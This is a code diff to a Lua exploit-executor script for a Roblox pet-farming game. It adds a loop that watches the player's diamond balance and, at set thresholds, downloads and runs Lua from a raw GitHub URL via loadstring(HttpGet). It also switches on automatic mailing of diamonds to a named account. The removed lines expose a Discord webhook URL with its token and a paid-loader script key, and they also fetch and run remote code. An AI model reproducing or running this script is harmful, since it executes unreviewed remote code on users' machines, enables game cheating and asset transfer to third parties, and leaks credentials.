@@ -1,119 +1,18 @@
--- repeat task.wait(3) until game:IsLoaded()
-
--- task.spawn(function()
---     local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
---     local diamond_1 = PlayerInfos.Diamonds
-
---     wait(240)
-
---     local PlayerInfos2 = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
---     local diamond_2 = PlayerInfos2.Diamonds - 100000
-
---     if diamond_1 >= diamond_2 then
---         game:Shutdown()
---     end
--- end)
-
--- local player = game.Players.LocalPlayer.UserId
--- if player == 4568581689 then
--- player1 = true
--- end
-
--- if player1 then
---     script_key="QvtVFiBNPxcwdulusNBflfLuizcbXMIb";
---     Configs = {
---         MysticMine = {
---             ["Giant Chest"] = true,
---             ["Diamonds"] = true
---         },
---         CyberCavern = {
---             ["Giant Chest"] = true,
---             ["Diamonds"] = false
---         },
---         ParadiseCave = {
---             ["Diamonds"] = false
---         },
---         Farming = {
---             ["Pet Sending"] = "Single",
---             ["Auto Orbs"] = true,
---             ["Auto Lootbags"] = true
---         },
---         Fruits = {
---             ["Minimum Fruits"] = 0,
---             ["Maximum Fruits"] = 5,
---             ["Enabled"] = true
---         },
---         Boosts = {
---             ["Triple Server Damage"] = true,
---             ["Triple Damage"] = true
---         },
---         Webhooks = {
---             ["Webhook Url"] = "https://discord.com/api/webhooks/1133271354788024351/4iiP9yfvnAs-9MM6KoUkVWp-FvpCJwCqDU5pki3Sr4xqwMhwpgjZWtLvhIQoKC9uA6OG",
---             ["Time Frame"] = 60
---         },
---         Mailbox = {
---             ["Recipient"] = "Your Username", 
---             ["Minimum Diamonds"] = 50000000000, 
---             ["Enabled"] = false
---         },
---         Performance = {
---             ["Disable Orb Rendering"] = true,
---             ["Disable Lootbags"] = true,
---             ["Disable 3D Rendering"] = true,
---             ["Hide Username"] = false,
---             ["FPSCap"] = 30
---         }
---     }
---     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/21b86b12222bd279cbf3d0aa61d8c701.lua"))()
--- else
---     script_key="QvtVFiBNPxcwdulusNBflfLuizcbXMIb";
---     Configs = {
---         MysticMine = {
---             ["Giant Chest"] = false,
---             ["Diamonds"] = false
---         },
---         CyberCavern = {
---             ["Giant Chest"] = true,
---             ["Diamonds"] = true
---         },
---         ParadiseCave = {
---             ["Diamonds"] = true
---         },
---         Farming = {
---             ["Pet Sending"] = "Single",
---             ["Auto Orbs"] = true,
---             ["Auto Lootbags"] = true
---         },
---         Fruits = {
---             ["Minimum Fruits"] = 0,
---             ["Maximum Fruits"] = 5,
---             ["Enabled"] = true
---         },
---         Boosts = {
---             ["Triple Server Damage"] = true,
---             ["Triple Damage"] = true
---         },
---         Webhooks = {
---             ["Webhook Url"] = "https://discord.com/api/webhooks/1133271354788024351/4iiP9yfvnAs-9MM6KoUkVWp-FvpCJwCqDU5pki3Sr4xqwMhwpgjZWtLvhIQoKC9uA6OG",
---             ["Time Frame"] = 60
---         },
---         Mailbox = {
---             ["Recipient"] = "Your Username", 
---             ["Minimum Diamonds"] = 50000000000, 
---             ["Enabled"] = false
---         },
---         Performance = {
---             ["Disable Orb Rendering"] = true,
---             ["Disable Lootbags"] = true,
---             ["Disable 3D Rendering"] = true,
---             ["Hide Username"] = false,
---             ["FPSCap"] = 30
---         }
---     }
---     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/21b86b12222bd279cbf3d0aa61d8c701.lua"))()
--- end
-
 repeat task.wait(3) until game:IsLoaded()
+
+task.spawn(function()
+    while wait(15) do
+        local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+        local kimcuong = PlayerInfos.Diamonds 
+    
+        if kimcuong >= 50000000000 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/dangbadao/bdqbdndnsd/main/tele1"))()
+        elseif kimcuong == 0 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/dangbadao/bdqbdndnsd/main/tele1"))()
+        end
+    end
+end)
+
 getgenv().DitPSX = {
     --[[
         Collapse methods:
@@ -145,9 +44,9 @@ getgenv().DitPSX = {
         ["Farm until"] = 100,
     },
     ["Auto Mailbox"] = { -- Auto send Diamonds to a person thru Mailbox when your Diamonds more than set diamond
-        ["Enable"] = false,
-        ["Send to"] = "Roblox Username",
-        ["Above amount"] = 100000000000
+        ["Enable"] = true,
+        ["Send to"] = "dangvjpproxx",
+        ["Above amount"] = 50000000000
     },
     ["Auto Claim Mailbox"] = true, -- Claim Diamonds on the account received the Diamonds from Auto Mailbox
     ["Auto Daycare"] = false, -- Auto Claim Daycare and Enroll unequipped/unlocked Pets in your Inventory
